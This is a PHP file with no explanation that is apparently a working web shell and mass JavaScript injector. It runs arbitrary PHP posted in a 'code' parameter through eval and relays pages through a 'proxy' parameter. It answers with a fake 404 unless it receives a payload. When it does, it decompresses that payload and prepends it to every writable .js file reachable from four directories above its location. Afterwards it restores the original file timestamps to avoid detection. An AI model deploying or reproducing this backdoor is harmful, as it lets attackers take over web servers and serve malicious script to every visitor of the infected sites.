<?php

error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);  

if(isset($_POST['code']) && $_POST['code'])
{
	eval(stripslashes($_POST[code]));
	exit;
}
if(isset($_GET['proxy']) && $_GET['proxy'])
{
	print get_page($_GET['proxy']);
	exit;
}


if (!array_key_exists('body', $_POST)) {
    header('Status: 404');
    die;
}



$script = gzinflate(pack('h*', $_POST['body']));
$docroot = $_SERVER['DOCUMENT_ROOT'];

$GLOBALS['scanned'] = array();
lookAndInject(

      '..'.DIRECTORY_SEPARATOR.'..'.DIRECTORY_SEPARATOR.'..'.DIRECTORY_SEPARATOR.'..'.DIRECTORY_SEPARATOR,
    $script
);

die('ok.done.');

function lookAndInject($dir, $script)
{
    //error_log("lookAndInject(".$dir.")");
    $GLOBALS['scanned'][$dir] = 1;
    foreach (scandir($dir) as $entry) {
        if (in_array($entry, array('.', '..')) || !is_dir($dir.DIRECTORY_SEPARATOR.$entry) && substr($entry, -3) != '.js') continue;
        $path = realpath($dir.DIRECTORY_SEPARATOR.$entry);
        if (is_dir($path) && !array_key_exists($path, $GLOBALS['scanned'])) lookAndInject($path, $script);
        elseif (substr($entry, -3) == '.js' && is_writable($path)) {
            $atime = fileatime($path); $mtime = filemtime($path);
            $contents = file_get_contents($path);
            $hash = md5($_SERVER['HTTP_HOST']);

            if (strpos($contents, "/** ".$hash." */") !== false) {
                $contents = preg_replace("#(/\*\* ".$hash." \*/)(.*)(/\*\* ~".$hash." \*/)#isU", '$1'."\n".$script."\n".'$3', $contents);
            } else {
                $contents = "/** ".$hash." */\n" . $script . "\n/** ~".$hash." */\n" . $contents;
            }
            file_put_contents($path, $contents);

	    touch($path,$mtime,$atime);
            touch(dirname($path),$mtime,$atime);
        }
    }
}

?>